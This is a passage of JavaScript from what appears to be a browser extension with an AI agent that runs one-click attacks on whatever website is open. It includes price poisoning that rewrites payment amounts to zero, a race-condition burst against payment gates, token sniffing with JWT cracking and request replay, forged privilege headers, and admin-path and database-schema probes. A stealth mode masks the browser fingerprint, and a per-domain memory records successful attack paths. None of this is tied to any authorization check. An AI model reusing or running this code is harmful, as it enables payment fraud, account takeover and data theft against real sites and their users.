    if (stateEl) { stateEl.textContent = 'force err: ' + e.message; stateEl.className = 'tm-state err'; }
  }
}
async function tmStopForce() {
  try {
    const { id } = await getActiveTab();
    await bg({ type: 'STOP_BALANCE_INTERCEPT', tabId: id });
    termWrite('info', '[FORCE] interceptor stopped.');
    status('Interceptor stopped.', 'ok');
  } catch (e) { termWrite('error', `[FORCE] stop failed: ${e.message}`); }
}
if (document.getElementById('tmForceBalance')) {
  document.getElementById('tmForceBalance').addEventListener('click', (e) => { e.preventDefault(); tmForceBalance(); });
}
if (document.getElementById('tmStopForce')) {
  document.getElementById('tmStopForce').addEventListener('click', (e) => { e.preventDefault(); tmStopForce(); });
}

// hook into agent run state to drive pulse dot
const _origSetAgentRunningUI = typeof setAgentRunningUI === 'function' ? setAgentRunningUI : null;
if (_origSetAgentRunningUI) {
  window.setAgentRunningUI = function (isRunning) {
    _origSetAgentRunningUI(isRunning);
    const pulse = document.getElementById('tmPulse');
    const stateEl = document.getElementById('tmState');
    if (pulse) pulse.classList.toggle('hidden', !isRunning);
    if (stateEl) {
      stateEl.textContent = isRunning ? 'thinking...' : 'idle';
      stateEl.className = 'tm-state' + (isRunning ? ' busy thinking-text' : '');
    }
  };
}

(async () => {
  try {
    const { id, url } = await getActiveTab();
    if (url) {
      $('#sqlUrl').value = url;
      try { $('#discoverBase').value = new URL(url).origin; } catch {}
    }
    tmRefreshUrl();
    setInterval(tmRefreshUrl, 4000);
    bg({ type: 'GET_DEBUG_STATE', tabId: id })
      .then((state) => setAttached(!!state.attached))
      .catch(() => {});
    bg({ type: 'GET_REWRITER_STATE' })
      .then((s) => { if (s?.active) rrStartPolling(); })
      .catch(() => {});
    chrome.tabs.sendMessage(id, { type: 'GET_SELECTED' }, (res) => {
      if (chrome.runtime.lastError) return;
      if (res?.data) { selectedSnapshot = res.data; setSelectedInfo(selectedSnapshot); }
    });

    // === Resume banner — print last session if popup was closed mid-run ===
    const sess = await loadAgentSession();
    if (sess && sess.goal) {
      const ageMin = Math.round((Date.now() - (sess.savedAt || 0)) / 60000);
      const status = sess.status || 'unknown';
      const target = sess.targetUrl || '(no target)';
      const banner =
        `Resuming audit on ${target} — Step ${sess.iter || 0}/${sess.maxIter || 15} ` +
        `(status: ${status}, ${ageMin}m ago)`;
      termWrite('info', banner);
      appendLog('info', banner);
      appendLog('info', `Last goal: ${sess.goal}`);
      if (Array.isArray(sess.lastResults)) {
        for (const r of sess.lastResults.slice(-5)) {
          appendLog(r.ok ? 'done' : 'error',
            `↺ ${r.tool}: ${(r.result || '').slice(0, 200)}`);
        }
      }
      // Pre-fill the goal box and surface a Resume button if there's room to continue.
      const ta = $('#agentGoal');
      if (ta && !ta.value) ta.value = sess.goal;
      if (status === 'paused' || status === 'running') {
        const btn = document.createElement('button');
        btn.textContent = `▶ Resume audit on ${(() => { try { return new URL(target).host; } catch { return target; } })()}`;
        btn.className = 'primary full';
        btn.style.marginTop = '8px';
        btn.addEventListener('click', () => { btn.remove(); runAgent(sess.goal); });
        const runBtn = document.getElementById('runAgent');
        if (runBtn && runBtn.parentNode) runBtn.parentNode.insertBefore(btn, runBtn);
      }
    }

    // === Knowledge-base smoke check (loud if it failed to load) ===
    if (typeof KNOWLEDGE_BASE === 'undefined') {
      termWrite('error', '[KB] knowledge.js missing — agent will run without embedded manual.');
    } else {
      const tcount = Object.keys(KNOWLEDGE_BASE.tools || {}).length;
      termWrite('info', `[KB] knowledge.js v${KNOWLEDGE_BASE.version} loaded — ${tcount} tools indexed.`);
    }
  } catch {}
})();

// =============================================================
// 👻 STEALTH GHOST — toggle UA masking on every RUN_FETCH
// =============================================================
let ghostModeOn = false;
(async () => {
  const { ghostMode } = await chrome.storage.local.get('ghostMode');
  ghostModeOn = !!ghostMode;
  _updateGhostBtn();
})();

function _updateGhostBtn() {
  const btn = document.getElementById('btnGhostToggle');
  if (!btn) return;
  btn.textContent = '👻 Stealth Ghost: ' + (ghostModeOn ? 'ON' : 'OFF');
  btn.classList.toggle('active', ghostModeOn);
}

const _ghostToggleBtn = document.getElementById('btnGhostToggle');
if (_ghostToggleBtn) _ghostToggleBtn.addEventListener('click', async (e) => {
  e.preventDefault();
  ghostModeOn = !ghostModeOn;
  await chrome.storage.local.set({ ghostMode: ghostModeOn });
  _updateGhostBtn();
  lotWrite(ghostModeOn
    ? '👻 Stealth Ghost ON — User-Agent, Accept-Language, headers randomised on every request.'
    : '👻 Stealth Ghost OFF — using your real browser fingerprint.',
    ghostModeOn ? 'lot-fin' : 'lot-warn');
});

// =============================================================
// 🧠 V-CORE ENGINE — domain memory for successful attack paths
// =============================================================
const VCORE_KEY = 'haley_vcore';

async function vcoreGet() {
  const res = await chrome.storage.local.get(VCORE_KEY);
  return res[VCORE_KEY] || {};
}
async function vcoreSaveSuccess(domain, vector, summary) {
  const mem = await vcoreGet();
  if (!mem[domain]) mem[domain] = {};
  mem[domain][vector] = { success: true, summary: String(summary).slice(0, 300), ts: Date.now() };
  await chrome.storage.local.set({ [VCORE_KEY]: mem });
}
async function vcoreGetDomain(domain) {
  const mem = await vcoreGet();
  return mem[domain] || {};
}

async function vcoreShowMemory() {
  const mem = await vcoreGet();
  const domains = Object.keys(mem);
  if (!domains.length) {
    lotWrite('🧠 V-Core memory is empty — run some attacks first to build memory.', 'lot-sys');
    return;
  }
  lotWrite('── 🧠 V-CORE MEMORY ──', 'lot-sys');
  for (const d of domains) {
    lotWrite('  Domain: ' + d, 'lot-sys');
    for (const [v, entry] of Object.entries(mem[d])) {
      const age = Math.round((Date.now() - entry.ts) / 60000);
      const icon = entry.success ? '✔' : '✗';
      lotWrite('    ' + icon + ' ' + v + ' — ' + entry.summary + ' (' + age + 'm ago)', entry.success ? 'lot-ok' : 'lot-warn');
    }
  }
}

const _vcoreBtn = document.getElementById('btnVCoreView');
if (_vcoreBtn) _vcoreBtn.addEventListener('click', async (e) => { e.preventDefault(); await vcoreShowMemory(); });

// =============================================================
// ⚡ LIVE OPERATION TERMINAL helpers
// =============================================================
function lotWrite(msg, cls) {
  const out = document.getElementById('lotOutput');
  if (!out) return;
  const line = document.createElement('span');
  line.className = 'lot-line ' + (cls || 'lot-sys');
  const ts = new Date().toTimeString().slice(0, 8);
  line.textContent = '[' + ts + '] ' + msg;
  out.appendChild(line);
  while (out.children.length > 300) out.removeChild(out.firstChild);
  out.scrollTop = out.scrollHeight;
}

const lotClearBtn = document.getElementById('lotClear');
if (lotClearBtn) lotClearBtn.addEventListener('click', (e) => {
  e.preventDefault();
  const out = document.getElementById('lotOutput');
  if (out) out.innerHTML = '';
});

// =============================================================
// 📋 EXPERIENCE LOG — remembers what failed per domain
// =============================================================
const EXP_LOG_KEY = 'haley_exp_log';

async function getExpLog() {
  const res = await chrome.storage.local.get(EXP_LOG_KEY);
  return res[EXP_LOG_KEY] || {};
}
async function logFailure(domain, vector, reason) {
  const log = await getExpLog();
  if (!log[domain]) log[domain] = {};
  log[domain][vector] = { failed: true, reason: String(reason).slice(0, 200), ts: Date.now() };
  await chrome.storage.local.set({ [EXP_LOG_KEY]: log });
  lotWrite('  Experience log updated — will skip ' + vector + ' on ' + domain + ' next time.', 'lot-warn');
}
async function hasFailedBefore(domain, vector) {
  const log = await getExpLog();
  return !!(log[domain] && log[domain][vector]);
}

const lotExpLogBtn = document.getElementById('lotExpLog');
if (lotExpLogBtn) lotExpLogBtn.addEventListener('click', async (e) => {
  e.preventDefault();
  const log = await getExpLog();
  const domains = Object.keys(log);
  if (!domains.length) { lotWrite('Experience log is empty — no failures recorded yet.', 'lot-sys'); return; }
  lotWrite('── EXPERIENCE LOG ──', 'lot-sys');
  for (const d of domains) {
    for (const [v, entry] of Object.entries(log[d])) {
      const age = Math.round((Date.now() - entry.ts) / 60000);
      lotWrite('  ' + d + ' / ' + v + ' → ' + entry.reason + ' (' + age + 'm ago)', 'lot-warn');
    }
  }
});

// helper — set attack button to running state
function setAttackRunning(id, running) {
  const btn = document.getElementById(id);
  if (!btn) return;
  btn.classList.toggle('running', running);
  btn.disabled = running;
}

// =============================================================
// ⚡ NEURAL TUNNEL — Evasion → Bridge → Endpoint Injection
// =============================================================
async function neuralTunnel() {
  if (!isSafeWebUrl(activeTabUrl)) { lotWrite('Navigate to a real website first.', 'lot-err'); return; }
  const domain = new URL(activeTabUrl).hostname;
  setAttackRunning('btnNeuralTunnel', true);
  lotWrite('⚡ NEURAL TUNNEL STARTING on ' + domain, 'lot-sys');
  try {
    // Phase 1: Evasion — WAF detect
    lotWrite('Phase 1: Evasion — detecting WAF/CDN...', 'lot-sys');
    if (await hasFailedBefore(domain, 'waf_detect')) {
      lotWrite('  WAF detect failed before on this domain — pivoting to header inject only', 'lot-warn');
    } else {
      try {
        const wafRes = await TOOLS.waf_detect();
        lotWrite('  WAF: ' + wafRes, wafRes.includes('blocked') ? 'lot-warn' : 'lot-ok');
        if (String(wafRes).includes('403')) await logFailure(domain, 'waf_detect', wafRes);
      } catch (e) {
        await logFailure(domain, 'waf_detect', e.message);
        lotWrite('  WAF probe failed: ' + e.message, 'lot-warn');
      }
    }

    // Phase 2: Bridge — map endpoints
    lotWrite('Phase 2: Bridge — mapping attack surface...', 'lot-sys');
    if (await hasFailedBefore(domain, 'discover_endpoints')) {
      lotWrite('  Endpoint discovery failed before — pivoting to auth crawler', 'lot-warn');
      const crawlRes = await TOOLS.auth_crawler();
      lotWrite('  Crawler: ' + crawlRes, 'lot-ok');
    } else {
      try {
        const discRes = await TOOLS.discover_endpoints({ deep: false });
        lotWrite('  Endpoints: ' + discRes, 'lot-ok');
      } catch (e) {
        await logFailure(domain, 'discover_endpoints', e.message);
        lotWrite('  Discovery failed — pivoting to auth crawler', 'lot-warn');
        try { const c = await TOOLS.auth_crawler(); lotWrite('  Crawler: ' + c, 'lot-ok'); } catch {}
      }
    }

    // Phase 3: Endpoint Injection — forge privilege headers + auth bypass
    lotWrite('Phase 3: Endpoint Injection — forging privilege headers...', 'lot-sys');
    if (await hasFailedBefore(domain, 'header_injector_pro')) {
      lotWrite('  Header injection failed before — running auth bypass only', 'lot-warn');
      const abRes = await TOOLS.auth_bypass_test();
      lotWrite('  Auth bypass: ' + abRes, String(abRes).includes('🚨') ? 'lot-hit' : 'lot-ok');
    } else {
      try {
        const hiRes = await TOOLS.header_injector_pro();
        lotWrite('  Headers injected: ' + hiRes, 'lot-ok');
        const abRes = await TOOLS.auth_bypass_test();
        lotWrite('  Auth bypass: ' + abRes, String(abRes).includes('🚨') ? 'lot-hit' : 'lot-ok');
      } catch (e) {
        await logFailure(domain, 'header_injector_pro', e.message);
        lotWrite('  Injection failed — logged. Trying auth bypass anyway...', 'lot-warn');
        try { const ab = await TOOLS.auth_bypass_test(); lotWrite('  ' + ab, 'lot-ok'); } catch {}
      }
    }

    lotWrite('✔ NEURAL TUNNEL COMPLETE — check findings above', 'lot-fin');
    await vcoreSaveSuccess(domain, 'neural_tunnel', 'WAF evasion + endpoint map + header inject completed');
    status('Neural Tunnel complete.', 'ok');
  } catch (e) {
    lotWrite('✗ Neural Tunnel error: ' + e.message, 'lot-err');
    status('Neural Tunnel failed: ' + e.message, 'error');
  } finally { setAttackRunning('btnNeuralTunnel', false); }
}

// =============================================================
// 🪞 SESSION MIRROR — Token Sniff → Storage Inject → Replay
// =============================================================
async function sessionMirror() {
  if (!isSafeWebUrl(activeTabUrl)) { lotWrite('Navigate to a real website first.', 'lot-err'); return; }
  const domain = new URL(activeTabUrl).hostname;
  setAttackRunning('btnSessionMirror', true);
  lotWrite('🪞 SESSION MIRROR STARTING on ' + domain, 'lot-sys');
  try {
    // Phase 1: Token sniff
    lotWrite('Phase 1: Token Sniff — scanning cookies, storage, JWTs...', 'lot-sys');
    const tokRes = await TOOLS.find_tokens();
    const tokStr = String(tokRes);
    lotWrite('  Tokens: ' + tokStr.slice(0, 250), tokStr.includes('found') || tokStr.includes('JWT') ? 'lot-hit' : 'lot-ok');

    // Phase 2: Storage injection — read hidden state
    lotWrite('Phase 2: Storage Inject — reading hidden state...', 'lot-sys');
    const stateRes = await TOOLS.read_hidden_state();
    lotWrite('  State: ' + String(stateRes).slice(0, 250), 'lot-ok');

    // Phase 3: Session audit
    lotWrite('Phase 3: Session audit — checking cookie security flags...', 'lot-sys');
    const sessRes = await TOOLS.session_audit();
    lotWrite('  Session: ' + String(sessRes).slice(0, 200), String(sessRes).includes('🚨') ? 'lot-hit' : 'lot-ok');

    // Auto-pivot: JWT found → crack it
    if (/jwt|bearer|token/i.test(tokStr)) {
      lotWrite('  JWT detected — auto-pivoting to JWT cracker...', 'lot-sys');
      try {
        const jwtRes = await TOOLS.jwt_cracker();
        lotWrite('  JWT: ' + String(jwtRes).slice(0, 200), String(jwtRes).includes('CRACKED') ? 'lot-hit' : 'lot-ok');
      } catch (e) { lotWrite('  JWT cracker: ' + e.message, 'lot-warn'); }
    }

    // Phase 4: Replay with found session
    lotWrite('Phase 4: Request replay with current session...', 'lot-sys');
    try {
      const replayRes = await TOOLS.request_replay({ url: activeTabUrl });
      lotWrite('  Replay: ' + String(replayRes).slice(0, 200), String(replayRes).includes('🚨') ? 'lot-hit' : 'lot-ok');
    } catch (e) {
      await logFailure(domain, 'request_replay', e.message);
      lotWrite('  Replay failed — logged.', 'lot-warn');
    }

    lotWrite('✔ SESSION MIRROR COMPLETE', 'lot-fin');
    await vcoreSaveSuccess(domain, 'session_mirror', 'Token sniff + session audit + request replay completed');
    status('Session Mirror complete.', 'ok');
  } catch (e) {
    await logFailure(domain, 'session_mirror', e.message);
    lotWrite('✗ Session Mirror error: ' + e.message, 'lot-err');
    status('Session Mirror failed: ' + e.message, 'error');
  } finally { setAttackRunning('btnSessionMirror', false); }
}

// =============================================================
// ☠ PRICE POISON — Network Listen → Intercept → Amount Rewrite
// =============================================================
async function pricePoisoner() {
  if (!isSafeWebUrl(activeTabUrl)) { lotWrite('Navigate to a real website first.', 'lot-err'); return; }
  const domain = new URL(activeTabUrl).hostname;
  setAttackRunning('btnPricePoison', true);
  lotWrite('☠ PRICE POISON STARTING on ' + domain, 'lot-sys');
  try {
    // Phase 1: Listen for JSON payloads
    lotWrite('Phase 1: Listening for JSON payloads and network traffic...', 'lot-sys');
    const netRes = await TOOLS.network_listener({ limit: 30 });
    lotWrite('  Network: ' + String(netRes).slice(0, 200), 'lot-ok');

    // Phase 2: Arm the interceptor
    lotWrite('Phase 2: Arming balance interceptor...', 'lot-sys');
    try {
      const { id } = await getActiveTab();
      const armRes = await bg({ type: 'START_BALANCE_INTERCEPT', tabId: id, value: 0 });
      lotWrite('  Interceptor: ' + (armRes?.message || 'armed — amount fields → 0'), 'lot-ok');
    } catch (e) { lotWrite('  Interceptor arm failed: ' + e.message, 'lot-warn'); }

    // Phase 3: Balance attack (35+ amounts including 0, -1, 0.001)
    lotWrite('Phase 3: Poisoning amount/price JSON keys...', 'lot-sys');
    if (await hasFailedBefore(domain, 'balance_attack')) {
      lotWrite('  Balance attack failed before — pivoting to packet poison', 'lot-warn');
      lotWrite('  Arm packet poisoner manually via Manual Toolbox → Packet Poison', 'lot-sys');
    } else {
      try {
        const balRes = await TOOLS.balance_attack({ url: activeTabUrl });
        lotWrite('  Balance attack: ' + String(balRes).slice(0, 200), String(balRes).includes('🚨') ? 'lot-hit' : 'lot-ok');
      } catch (e) {
        await logFailure(domain, 'balance_attack', e.message);
        lotWrite('  Balance attack failed — auto-pivoting to logic flaw test', 'lot-warn');
        try {
          const logicRes = await TOOLS.logic_flaw_test({ url: activeTabUrl });
          lotWrite('  Logic: ' + String(logicRes).slice(0, 200), String(logicRes).includes('🚨') ? 'lot-hit' : 'lot-ok');
        } catch {}
      }
    }

    lotWrite('✔ PRICE POISON COMPLETE — refresh your checkout/wallet page', 'lot-fin');
    await vcoreSaveSuccess(domain, 'price_poison', 'Network listen + balance intercept + amount poison completed');
    status('Price Poison complete — refresh wallet page to confirm.', 'ok');
  } catch (e) {
    await logFailure(domain, 'price_poison', e.message);
    lotWrite('✗ Price Poison error: ' + e.message, 'lot-err');
    status('Price Poison failed: ' + e.message, 'error');
  } finally { setAttackRunning('btnPricePoison', false); }
}

// =============================================================
// 👻 GHOST PROTOCOL — Race Condition → Payment Gate
// =============================================================
async function ghostProtocol() {
  if (!isSafeWebUrl(activeTabUrl)) { lotWrite('Navigate to a real website first.', 'lot-err'); return; }
  const domain = new URL(activeTabUrl).hostname;
  setAttackRunning('btnGhostProtocol', true);
  lotWrite('👻 GHOST PROTOCOL STARTING on ' + domain, 'lot-sys');
  try {
    // Phase 1: Map payment endpoints
    lotWrite('Phase 1: Mapping payment endpoints...', 'lot-sys');
    const netRes = await TOOLS.network_listener({ limit: 50 });
    lotWrite('  Captured: ' + String(netRes).slice(0, 200), 'lot-ok');

    // Phase 2: Logic flaw scan
    lotWrite('Phase 2: Logic flaw scan...', 'lot-sys');
    try {
      const logicRes = await TOOLS.logic_flaw_test({ url: activeTabUrl });
      lotWrite('  Logic: ' + String(logicRes).slice(0, 200), String(logicRes).includes('🚨') ? 'lot-hit' : 'lot-ok');
    } catch (e) { lotWrite('  Logic test: ' + e.message, 'lot-warn'); }

    // Phase 3: Race condition burst
    lotWrite('Phase 3: Launching async race condition burst (50 requests)...', 'lot-sys');
    if (await hasFailedBefore(domain, 'race_condition')) {
      lotWrite('  Race condition failed before — pivoting to IDOR test', 'lot-warn');
      try {
        const idorRes = await TOOLS.idor_test({ url: activeTabUrl });
        lotWrite('  IDOR: ' + String(idorRes).slice(0, 200), String(idorRes).includes('🚨') ? 'lot-hit' : 'lot-ok');
      } catch (e) { lotWrite('  IDOR: ' + e.message, 'lot-warn'); }
    } else {
      try {
        const raceRes = await TOOLS.race_condition({ url: activeTabUrl, count: 50 });
        lotWrite('  Race: ' + String(raceRes).slice(0, 200), String(raceRes).includes('🚨') ? 'lot-hit' : 'lot-ok');
      } catch (e) {
        await logFailure(domain, 'race_condition', e.message);
        lotWrite('  Race failed — pivoting to infra logic breaker', 'lot-warn');
        try {
          const infraRes = await TOOLS.infra_logic_breaker({ url: activeTabUrl });
          lotWrite('  Infra: ' + String(infraRes).slice(0, 200), 'lot-ok');
        } catch {}
      }
    }

    // Phase 4: Rate limit probe
    lotWrite('Phase 4: Rate limit probe...', 'lot-sys');
    try {
      const rlRes = await TOOLS.rate_limit_test({ url: activeTabUrl, count: 20 });
      lotWrite('  Rate limit: ' + String(rlRes).slice(0, 200), String(rlRes).includes('🚨') ? 'lot-hit' : 'lot-ok');
    } catch (e) { lotWrite('  Rate limit: ' + e.message, 'lot-warn'); }

    lotWrite('✔ GHOST PROTOCOL COMPLETE', 'lot-fin');
    await vcoreSaveSuccess(domain, 'ghost_protocol', 'Payment gate race condition + rate limit probe completed');
    status('Ghost Protocol complete.', 'ok');
  } catch (e) {
    await logFailure(domain, 'ghost_protocol', e.message);
    lotWrite('✗ Ghost Protocol error: ' + e.message, 'lot-err');
    status('Ghost Protocol failed: ' + e.message, 'error');
  } finally { setAttackRunning('btnGhostProtocol', false); }
}

// =============================================================
// 🔍 PRE-ATTACK SCAN — WAF · Headers · CORS · SQLi · IDOR
// =============================================================
async function preAttackScan() {
  if (!isSafeWebUrl(activeTabUrl)) { lotWrite('Navigate to a real website first.', 'lot-err'); return; }
  const domain = new URL(activeTabUrl).hostname;
  setAttackRunning('btnPreScan', true);
  lotWrite('🔍 PRE-ATTACK SCAN — ' + domain, 'lot-sys');
  lotWrite('Running 5 probes before any attack... please wait.', 'lot-sys');

  const results = {};

  // 1 — WAF / CDN detection
  lotWrite('① WAF / CDN detection...', 'lot-sys');
  try {
    const r = await TOOLS.waf_detect();
    results.waf = String(r);
    lotWrite('  ' + results.waf, results.waf.includes('🚨') ? 'lot-hit' : 'lot-ok');
  } catch (e) { results.waf = 'failed'; lotWrite('  WAF probe failed: ' + e.message, 'lot-warn'); }

  // 2 — Security header audit
  lotWrite('② Security headers...', 'lot-sys');
  try {
    const r = await TOOLS.security_headers({ url: activeTabUrl });
    results.headers = String(r);
    lotWrite('  ' + results.headers.slice(0, 200), results.headers.includes('🚨') ? 'lot-hit' : 'lot-ok');
  } catch (e) { results.headers = 'failed'; lotWrite('  Header check failed: ' + e.message, 'lot-warn'); }

  // 3 — CORS test
  lotWrite('③ CORS policy...', 'lot-sys');
  try {
    const r = await TOOLS.cors_test({ url: activeTabUrl });
    results.cors = String(r);
    lotWrite('  ' + results.cors.slice(0, 200), results.cors.includes('🚨') ? 'lot-hit' : 'lot-ok');
  } catch (e) { results.cors = 'failed'; lotWrite('  CORS test failed: ' + e.message, 'lot-warn'); }

  // 4 — SQLi quick probe
  lotWrite('④ SQL injection probe...', 'lot-sys');
  try {
    const r = await TOOLS.sql_injection({ url: activeTabUrl });
    results.sqli = String(r);
    lotWrite('  ' + results.sqli.slice(0, 200), results.sqli.includes('🚨') ? 'lot-hit' : 'lot-ok');
  } catch (e) { results.sqli = 'failed'; lotWrite('  SQLi probe failed: ' + e.message, 'lot-warn'); }

  // 5 — IDOR quick probe
  lotWrite('⑤ IDOR / object access...', 'lot-sys');
  try {
    const r = await TOOLS.idor_test({ url: activeTabUrl });
    results.idor = String(r);
    lotWrite('  ' + results.idor.slice(0, 200), results.idor.includes('🚨') ? 'lot-hit' : 'lot-ok');
  } catch (e) { results.idor = 'failed'; lotWrite('  IDOR probe failed: ' + e.message, 'lot-warn'); }

  // Summary
  const hits = Object.values(results).filter(v => v.includes('🚨')).length;
  lotWrite('── SCAN COMPLETE — ' + hits + ' issue(s) found. Use attack buttons above to investigate further.', hits > 0 ? 'lot-hit' : 'lot-fin');
  await vcoreSaveSuccess(domain, 'pre_attack_scan', hits + ' finding(s): WAF=' + (results.waf || '?').slice(0, 40));
  status('Pre-Attack Scan done — ' + hits + ' issue(s). Check Live Terminal.', hits > 0 ? 'error' : 'ok');
  setAttackRunning('btnPreScan', false);
}

// =============================================================
// 🗄 SCHEMA AUDITOR — detect sensitive key leaks in API responses
// =============================================================
const SENSITIVE_KEYS = [
  'card_number','cardnumber','card_num','cvv','cvc','expiry','exp_date',
  'pan','cc_number','credit_card','debit_card','account_number','routing_number',
  'balance','wallet_balance','account_balance','available_balance','real_balance',
  'plain_password','password_hash','raw_password','secret_key','private_key',
  'api_key','api_secret','access_token','refresh_token','auth_token','bearer',
  'ssn','social_security','passport_number','national_id','tax_id',
  'bank_account','swift_code','iban','sort_code',
];

async function schemaAuditor() {
  if (!isSafeWebUrl(activeTabUrl)) { lotWrite('Navigate to a real website first.', 'lot-err'); return; }
  const origin = new URL(activeTabUrl).origin;
  const domain = new URL(activeTabUrl).hostname;
  setAttackRunning('btnSchemaAudit', true);
  lotWrite('🗄 SCHEMA AUDITOR — scanning API responses on ' + domain, 'lot-sys');

  const API_PATHS = [
    '/api/v1/user', '/api/v1/me', '/api/v1/profile', '/api/v1/account',
    '/api/v1/wallet', '/api/v1/balance', '/api/v1/orders', '/api/v1/payments',
    '/api/v2/user', '/api/v2/me', '/api/user', '/api/me', '/api/account',
    '/api/profile', '/api/wallet', '/api/balance', '/api/orders',
    '/user', '/me', '/account', '/profile',
  ];

  let totalHits = 0;

  for (const path of API_PATHS) {
    const url = origin + path;
    try {
      const res = await bg({ type: 'RUN_FETCH', params: { url, method: 'GET', credentials: 'include' } });
      if (!res.ok || res.status >= 400) continue;
      const body = (res.body || '').toLowerCase();
      const foundKeys = SENSITIVE_KEYS.filter(k => body.includes('"' + k + '"') || body.includes("'" + k + "'") || body.includes(k + ':'));
      if (foundKeys.length > 0) {
        totalHits += foundKeys.length;
        lotWrite('  🚨 ' + path + ' leaks: ' + foundKeys.join(', '), 'lot-hit');
      } else {
        lotWrite('  ✔ ' + path + ' — no sensitive keys in response (' + res.status + ')', 'lot-ok');
      }
    } catch (e) { /* skip unreachable paths */ }
  }

  if (totalHits === 0) {
    lotWrite('✔ SCHEMA AUDITOR COMPLETE — no sensitive key leaks found in API responses.', 'lot-fin');
  } else {
    lotWrite('🚨 SCHEMA AUDITOR COMPLETE — ' + totalHits + ' sensitive key(s) exposed in API responses!', 'lot-hit');
  }
  await vcoreSaveSuccess(domain, 'schema_auditor', totalHits + ' sensitive key leak(s) found');
  status('Schema Auditor done — ' + totalHits + ' key leak(s). Check Live Terminal.', totalHits > 0 ? 'error' : 'ok');
  setAttackRunning('btnSchemaAudit', false);
}

// =============================================================
// 🔑 SESSION PRIVILEGE ESCALATOR — normal token → admin endpoints
// =============================================================
const ADMIN_PATHS = [
  '/admin', '/admin/', '/admin/dashboard', '/admin/users', '/admin/orders',
  '/api/admin', '/api/admin/users', '/api/admin/stats', '/api/admin/dashboard',
  '/api/v1/admin', '/api/v1/admin/users', '/api/v1/admin/orders',
  '/dashboard/admin', '/superuser', '/staff', '/manage', '/management',
  '/api/superuser', '/api/staff', '/api/manage',
  '/api/v1/users', '/api/v1/all-users', '/api/v1/all_users',
  '/api/v1/transactions', '/api/v1/all-orders', '/api/v1/reports',
];

async function sessionPrivEscalator() {
  if (!isSafeWebUrl(activeTabUrl)) { lotWrite('Navigate to a real website first.', 'lot-err'); return; }
  const origin = new URL(activeTabUrl).origin;
  const domain = new URL(activeTabUrl).hostname;
  setAttackRunning('btnPrivEsc', true);
  lotWrite('🔑 PRIV ESCALATOR — testing normal session against admin endpoints on ' + domain, 'lot-sys');
  lotWrite('Using YOUR current browser session cookies only.', 'lot-sys');

  let accessible = 0;

  for (const path of ADMIN_PATHS) {
    const url = origin + path;
    try {
      const res = await bg({ type: 'RUN_FETCH', params: { url, method: 'GET', credentials: 'include' } });
      if (res.status === 200 || res.status === 201) {
        accessible++;
        lotWrite('  🚨 ' + path + ' → HTTP ' + res.status + ' ACCESSIBLE with normal session!', 'lot-hit');
      } else if (res.status === 403 || res.status === 401) {
        lotWrite('  ✔ ' + path + ' → ' + res.status + ' (properly blocked)', 'lot-ok');
      } else if (res.status === 404) {
        // skip — endpoint doesn't exist
      } else {
        lotWrite('  ⚠ ' + path + ' → ' + res.status, 'lot-warn');
      }
    } catch (e) { /* skip unreachable */ }
  }

  if (accessible === 0) {
    lotWrite('✔ PRIV ESCALATOR COMPLETE — all admin endpoints properly restricted.', 'lot-fin');
  } else {
    lotWrite('🚨 PRIV ESCALATOR COMPLETE — ' + accessible + ' admin endpoint(s) accessible with normal session!', 'lot-hit');
  }
  await vcoreSaveSuccess(domain, 'priv_escalator', accessible + ' admin endpoint(s) accessible');
  status('Priv Escalator done — ' + accessible + ' accessible. Check Live Terminal.', accessible > 0 ? 'error' : 'ok');
  setAttackRunning('btnPrivEsc', false);
}

// =============================================================
// 🗃️ DB SIPHON — Deep schema extraction + sensitive key dump
// =============================================================
const DB_SIPHON_PATHS = [
  '/api/v1/schema', '/api/schema', '/api/db/schema', '/api/database/schema',
  '/api/v1/tables', '/api/tables', '/api/db/tables', '/api/database/tables',
  '/api/v1/admin/schema', '/api/admin/schema', '/api/v1/admin/tables',
  '/api/v1/users', '/api/v1/all-users', '/api/users', '/api/all-users',
  '/api/v1/orders', '/api/v1/payments', '/api/v1/transactions',
  '/api/orders', '/api/payments', '/api/transactions',
  '/api/v1/products', '/api/products', '/api/v1/items', '/api/items',
  '/api/v1/logs', '/api/logs', '/api/v1/events', '/api/events',
  '/api/v1/config', '/api/config', '/api/v1/settings', '/api/settings',
  '/api/v1/keys', '/api/keys', '/api/v1/tokens', '/api/tokens',
  '/api/v1/secrets', '/api/secrets', '/api/v1/webhooks', '/api/webhooks',
  '/api/debug/schema', '/api/debug/tables', '/api/debug/db',
  '/graphql', '/api/graphql', '/v1/graphql',
];

const DB_SCHEMA_KEYS = [
  'table','tables','schema','columns','column','type','field','fields',
  'model','models','entity','entities','database','db','relation',
  'id','primary_key','foreign_key','index','constraint',
  'password','hash','salt','secret','token','api_key',
  'credit_card','card_number','cvv','ssn','national_id','passport',
  'bank_account','routing_number','iban','swift',
  'balance','wallet','credits','coins','points',
];

async function dbSiphon() {
  if (!isSafeWebUrl(activeTabUrl)) { lotWrite('Navigate to a real website first.', 'lot-err'); return; }
  const origin = new URL(activeTabUrl).origin;
  const domain = new URL(activeTabUrl).hostname;
  setAttackRunning('btnDbSiphon', true);
  lotWrite('🗃️ DB SIPHON — deep schema extraction on ' + domain, 'lot-sys');
  lotWrite('Phase 1: Probing schema/table endpoints...', 'lot-sys');

  let hits = 0;
  const findings = [];

  for (const path of DB_SIPHON_PATHS) {
    const url = origin + path;
    try {
      const res = await bg({ type: 'RUN_FETCH', params: { url, method: 'GET', credentials: 'include' } });
      if (!res.ok || res.status >= 400) continue;
      const body = (res.body || '').toLowerCase();
      const foundKeys = DB_SCHEMA_KEYS.filter(k =>
        body.includes('"' + k + '"') || body.includes("'" + k + "'") || body.includes(k + ':') || body.includes('.' + k)
      );
      if (foundKeys.length > 0) {
        hits += foundKeys.length;
        const finding = { path, status: res.status, keys: foundKeys, snippet: (res.body || '').slice(0, 300) };
        findings.push(finding);
        lotWrite('  🚨 ' + path + ' [' + res.status + '] — leaked: ' + foundKeys.slice(0, 8).join(', '), 'lot-hit');
        // Store in v-core
        await vcoreSaveSuccess(domain, 'db_siphon_endpoint', path + ' leaked: ' + foundKeys.join(', '));
      } else if (res.status === 200) {
        lotWrite('  ✔ ' + path + ' → 200 (no schema keys found)', 'lot-ok');
      }
    } catch (_) {}
  }

  // Phase 2 — GraphQL introspection
  lotWrite('Phase 2: GraphQL introspection probe...', 'lot-sys');
  for (const gqlPath of ['/graphql', '/api/graphql', '/v1/graphql', '/graphiql']) {
    try {
      const res = await bg({ type: 'RUN_FETCH', params: {
        url: origin + gqlPath, method: 'POST', credentials: 'include',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ query: '{ __schema { types { name fields { name type { name } } } } }' }),
      }});
